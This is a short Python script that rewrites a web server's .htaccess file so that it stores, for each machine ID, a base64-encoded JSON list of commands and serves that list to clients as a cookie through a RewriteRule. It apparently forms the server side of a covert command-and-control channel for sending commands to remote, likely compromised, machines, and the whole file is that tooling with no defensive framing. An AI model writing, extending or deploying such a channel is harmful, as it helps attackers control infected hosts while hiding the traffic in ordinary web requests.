#!/usr/bin/env python
import io
import re
import base64
import sys
import json

def editcommand( id, command ):
	#read the file
	with open('/var/www/html/.htaccess', 'r') as file:
		data = file.readlines()

	location = 0

	#find the line in which a cookie entry for that ID is stored
	#if it doesn't exist, create a new entry
	for i in range(len(data)):
		indices = re.finditer(':', data[i])
		indices_array = [index.start() for index in indices]
		machine_id = re.finditer('=',data[i])
		id_array = [index.start() for index in machine_id]

		if i > 0 and id == data[i][id_array[0]+1:indices_array[0]]:
			print('ID was found!')
			print(data[i])
			location = i

			#get the string value of the old command and add the new command
			old_entry = str(data[location][indices_array[0]+1:indices_array[1]])
			print("old_entry: " + old_entry)

			old_entry_bytes = old_entry.encode('ascii')
			decoded_old_bytes = base64.b64decode(old_entry_bytes)
			#get the decoded json that was previously being stored in .htaccess
			decoded_entry = decoded_old_bytes.decode('ascii')

			#print("decoded_entry: " + decoded_entry)

			json_data = json.loads(decoded_entry)
			new_command = {str(len(json_data)+1): command}
			json_data.update(new_command)
			#print(json.dumps(json_data))

			json_string = str(json.dumps(json_data))
			#re-encode the new json which includes the updated command list
			updated_entry = json_string.encode('ascii')
			updated_bytes = base64.b64encode(updated_entry)
			encoded_updated = updated_bytes.decode('ascii')
			#print(encoded_updated)
			data[location] = "RewriteRule .* - [CO=" + id + ":" + encoded_updated + ":blah.com:0]\n"

	#handle the case in which the id isn't found
	if location == 0:
		print('Creating new entry...')
		#put new command in json format and base64 encode it
		command_json = "{\"1\": \"" + command + "\"}"
		command_ascii = command_json.encode('ascii')
		command_bytes = base64.b64encode(command_ascii)
		command_encoded = command_bytes.decode('ascii')
		new_entry = "RewriteRule .* - [CO=" + id + ":" + command_encoded + ":blah.com:0]\n"
		#append the new entry to the existing data array
		data.extend(new_entry)

	#write the new contents to the file
	with open('/var/www/html/.htaccess', 'w') as file:
		file.writelines(data)
	return True

if __name__ == "__main__":
	editcommand(*sys.argv[1:])
